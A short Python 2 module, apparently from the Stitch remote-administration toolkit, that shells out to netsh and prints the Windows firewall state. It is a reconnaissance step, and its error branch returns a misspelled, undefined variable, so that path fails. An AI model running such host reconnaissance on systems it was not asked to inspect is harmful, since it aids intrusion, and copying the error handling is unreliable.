# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import _winreg
import subprocess

def checklocalfw():
    print("Getting Windows Built in Firewall configuration...")
    fw = subprocess.Popen('netsh advfirewall show all state',shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
    fw_mode, errors = fw.communicate()
    if not errors and fw_mode:
        return fw_mode
    else:
        return errros

print checklocalfw()
